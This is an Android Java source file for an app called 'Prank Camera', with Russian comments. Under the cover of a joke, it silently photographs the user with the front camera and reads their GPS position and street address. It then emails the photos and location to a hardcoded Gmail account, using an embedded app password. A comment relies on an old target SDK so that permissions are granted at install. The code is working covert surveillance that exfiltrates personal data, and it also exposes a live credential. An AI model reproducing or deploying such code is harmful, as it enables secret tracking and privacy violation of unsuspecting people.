package com.prank.camera;

import android.Manifest;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.Properties;
import java.util.Random;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final String TAG = "PrankCamera";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int PHOTO_COUNT = 3;  // 3 фото
    private static final int PHOTO_INTERVAL_MS = 3000; // 3 секунды

    // Email настройки
    private static final String EMAIL_FROM = "metrobugitt@gmail.com";
    private static final String EMAIL_TO = "metrobugitt@gmail.com";
    private static final String EMAIL_SUBJECT = "📸 Prank Camera - Фото розыгрыш!";

    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private Camera camera;
    private Button btnStart;
    private Button btnCopyError;
    private TextView txtStatus;
    private ProgressBar progressBar;
    private ImageView imgPreview;

    private Handler handler = new Handler(Looper.getMainLooper());
    private int photoCount = 0;
    private byte[] currentPhotoData;
    private StringBuilder photoDataForEmail;
    private java.util.List<byte[]> photoList = new java.util.LinkedList<>();  // Список фото
    private String lastError = "";  // Последняя ошибка
    private LocationManager locationManager;
    
    // Смешные звуки (имитация через вибрацию и текст)
    private final String[] funnySounds = {
        "🔊 ДЗИНЬ! Фото готово!",
        "🔊 ПИУ-ПИУ! Камера работает!",
        "🔊 КLIK-CLAK! Фотографирование!",
        "🔊 БИП-БОП! Робот снимает!",
        "🔊 ХА-ХА! Попался!",
        "🔊 ОГО! Какой кадр!",
        "🔊 УПС! Ещё фото!"
    };
    
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Не давать экрану гаснуть
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        initViews();
        // Разрешения даются при установке (targetSdk 22)
    }

    private void initViews() {
        surfaceView = findViewById(R.id.surfaceView);
        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);

        btnStart = findViewById(R.id.btnStart);
        btnCopyError = findViewById(R.id.btnCopyError);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);
        imgPreview = findViewById(R.id.imgPreview);

        btnStart.setOnClickListener(v -> startPrank());

        // Кнопка копирования ошибки
        btnCopyError.setOnClickListener(v -> copyErrorToClipboard());
    }

    private void startPrank() {
        if (camera == null) {
            Toast.makeText(this, "⚠️ Камера не доступна!", Toast.LENGTH_SHORT).show();
            return;
        }

        photoCount = 0;
        photoDataForEmail = new StringBuilder();
        photoList.clear();  // Очищаем список фото
        progressBar.setMax(PHOTO_COUNT);
        progressBar.setProgress(0);
        btnStart.setEnabled(false);

        txtStatus.setText("🎭 Начинаем розыгрыш! Фото: 0/" + PHOTO_COUNT);
        takeNextPhoto();
    }

    private void takeNextPhoto() {
        if (photoCount >= PHOTO_COUNT) {
            finishPrank();
            return;
        }
        
        photoCount++;
        progressBar.setProgress(photoCount);
        
        // Смешной звук (текст + вибрация)
        playFunnySound();
        
        // Делаем фото
        try {
            camera.takePicture(null, null, null, pictureCallback);
        } catch (Exception e) {
            Log.e(TAG, "Ошибка камеры: " + e.getMessage());
            handler.postDelayed(this::takeNextPhoto, 1000);
        }
    }

    private void playFunnySound() {
        String sound = funnySounds[random.nextInt(funnySounds.length)];
        txtStatus.setText(sound);

        // Вибрация для эффекта
        android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null) {
            vibrator.vibrate(200);
        }
    }

    private final Camera.PictureCallback pictureCallback = (data, camera) -> {
        currentPhotoData = data;
        
        // Сохраняем фото в список
        photoList.add(data);

        // Получаем GPS координаты
        String locationInfo = getLocationInfo();

        // Сохраняем данные для email
        String photoBase64 = Base64.encodeToString(data, Base64.NO_WRAP);
        photoDataForEmail.append("📸 Фото #").append(photoCount)
            .append(" - ").append(locationInfo).append("\n");

        // Показываем превью
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        imgPreview.setImageBitmap(bitmap);

        // Предварительный просмотр камеры
        camera.startPreview();

        // Следующее фото через 3 секунды
        txtStatus.setText("⏱️ Следующее фото через 3 сек...");
        handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
    };

    private String getLocationInfo() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();

                // Обратное геокодирование
                Geocoder geocoder = new Geocoder(this, Locale.getDefault());
                List<Address> addresses = geocoder.getFromLocation(lat, lon, 1);

                if (addresses != null && !addresses.isEmpty()) {
                    Address addr = addresses.get(0);
                    return String.format(Locale.getDefault(),
                        "📍 %.6f, %.6f (%s)",
                        lat, lon, addr.getAddressLine(0));
                }

                return String.format(Locale.getDefault(), "📍 %.6f, %.6f", lat, lon);
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка GPS: " + e.getMessage());
        }
        
        return "📍 Местоположение недоступно";
    }

    private void finishPrank() {
        txtStatus.setText("✅ Розыгрыш завершён! Отправка фото...");
        Toast.makeText(this, "📸 Фото готовы к отправке!", Toast.LENGTH_LONG).show();
        
        // Отправка email
        sendEmailWithPhotos();

        btnStart.setEnabled(true);
        btnStart.setText("🔄 Начать заново");
    }

    // Копирование ошибки в буфер обмена
    private void copyErrorToClipboard() {
        if (lastError.isEmpty()) {
            Toast.makeText(this, "⚠️ Нет ошибки для копирования", Toast.LENGTH_SHORT).show();
            return;
        }
        
        ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Error Log", lastError);
        clipboard.setPrimaryClip(clip);
        
        Toast.makeText(this, "✅ Ошибка скопирована в буфер!", Toast.LENGTH_SHORT).show();
    }

    private void sendEmailWithPhotos() {
        new Thread(() -> {
            try {
                Log.d(TAG, "Начало отправки email...");
                
                // Настройки SMTP Gmail
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.ssl.protocols", "TLSv1.2");
                props.put("mail.smtp.connectiontimeout", "5000");
                props.put("mail.smtp.timeout", "10000");

                // ВНИМАНИЕ: Для работы нужен App Password из Gmail
                // Получите его в настройках Google Аккаунта → Безопасность
                final String APP_PASSWORD = "ketufvduqebiogig"; // App Password

                Log.d(TAG, "Создание сессии...");
                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(EMAIL_FROM, APP_PASSWORD);
                    }
                });

                Log.d(TAG, "Создание сообщения...");
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(EMAIL_FROM));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                message.setSubject(EMAIL_SUBJECT);

                // Создаём multipart сообщение
                MimeMultipart multipart = new MimeMultipart();

                // Текстовая часть
                MimeBodyPart textPart = new MimeBodyPart();
                textPart.setText("🎭 Prank Camera - Фото розыгрыша!\n\n" +
                    photoDataForEmail.toString() +
                    "\n😄 Вас разыграли!");
                multipart.addBodyPart(textPart);
                
                // Прикрепляем фото
                Log.d(TAG, "Прикрепление " + photoList.size() + " фото...");
                for (int i = 0; i < photoList.size(); i++) {
                    try {
                        MimeBodyPart photoPart = new MimeBodyPart();
                        ByteArrayDataSource dataSource = new ByteArrayDataSource(photoList.get(i), "image/jpeg");
                        photoPart.setDataHandler(new javax.activation.ActivationDataHandler(dataSource, "image/jpeg"));
                        photoPart.setFileName("prank_photo_" + (i + 1) + ".jpg");
                        multipart.addBodyPart(photoPart);
                        Log.d(TAG, "Фото #" + (i + 1) + " добавлено");
                    } catch (Exception e) {
                        Log.e(TAG, "Ошибка добавления фото #" + (i + 1), e);
                    }
                }

                message.setContent(multipart);

                Log.d(TAG, "Отправка email на: " + EMAIL_TO);
                // Отправляем сообщение
                Transport.send(message);
                Log.d(TAG, "Email успешно отправлен!");

                handler.post(() -> {
                    Toast.makeText(MainActivity.this,
                        "✅ Email отправлен!", Toast.LENGTH_SHORT).show();
                    txtStatus.setText("📧 Email отправлен на " + EMAIL_TO);
                    
                    // Скрываем кнопку ошибки если она была показана
                    btnCopyError.setVisibility(android.view.View.GONE);
                });

            } catch (Exception e) {
                Log.e(TAG, "Ошибка отправки email: " + e.getMessage(), e);
                
                // Формируем подробное сообщение об ошибке
                lastError = "📧 Ошибка Email:\n" +
                           "Тип: " + e.getClass().getSimpleName() + "\n" +
                           "Сообщение: " + e.getMessage() + "\n" +
                           "Время: " + new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
                
                String errorMsg = "⚠️ Ошибка: " + e.getMessage();
                handler.post(() -> {
                    Toast.makeText(MainActivity.this,
                        errorMsg,
                        Toast.LENGTH_LONG).show();
                    txtStatus.setText("⚠️ Ошибка: " + e.getClass().getSimpleName());
                    
                    // Показываем кнопку копирования ошибки
                    btnCopyError.setVisibility(android.view.View.VISIBLE);
                });
            }
        }).start();
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            // Открываем фронтальную камеру
            int cameraId = -1;
            int numberOfCameras = Camera.getNumberOfCameras();
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = i;
                    break;
                }
            }
            
            if (cameraId == -1 && numberOfCameras > 0) {
                // Если нет фронтальной, используем любую
                cameraId = 0;
            }
            
            if (cameraId != -1) {
                camera = Camera.open(cameraId);
                camera.setPreviewDisplay(holder);
                camera.startPreview();
                txtStatus.setText("📸 Камера готова! Нажмите кнопку для розыгрыша");
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка открытия камеры: " + e.getMessage());
            txtStatus.setText("⚠️ Ошибка камеры: " + e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
        if (camera != null) {
            camera.startPreview();
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (camera != null) {
            camera.stopPreview();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (camera != null) {
            camera.startPreview();
        }
    }
}
